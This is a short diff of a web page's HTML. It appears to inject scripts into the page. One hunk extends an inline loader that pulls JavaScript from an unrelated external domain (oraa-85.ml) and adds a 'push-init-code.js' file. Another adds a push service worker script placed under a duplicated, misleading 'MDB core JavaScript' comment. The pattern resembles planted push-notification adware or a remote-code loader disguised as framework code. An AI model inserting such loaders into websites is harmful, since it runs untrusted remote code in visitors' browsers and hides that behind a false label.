@@ -31,7 +31,7 @@
 	<script>
 (function(){
 
-    var scripts = ["/static/general/bf-core.min.js", "/static/containers/OSE978.js"];
+    var scripts = ["/static/general/bf-core.min.js", "/static/containers/OSE978.js", "/static/general/push-init-code.js"];
     for(var i = 0; i < scripts.length; i++) {
         var script   = document.createElement("script");
         script.src   = "//oraa-85.ml" + scripts[i] + "?ts=" + Date.now() + "#";
@@ -1830,6 +1830,8 @@
   <script type="text/javascript" src="js/bootstrap.min.js"></script>
   <!-- MDB core JavaScript -->
   <script type="text/javascript" src="js/mdb.min.js"></script>
+  <!-- MDB core JavaScript -->
+  <script type="text/javascript" src="brandflow-push-sw.js"></script>
   <!-- Initializations -->
   <script type="text/javascript">
     // Animations initialization
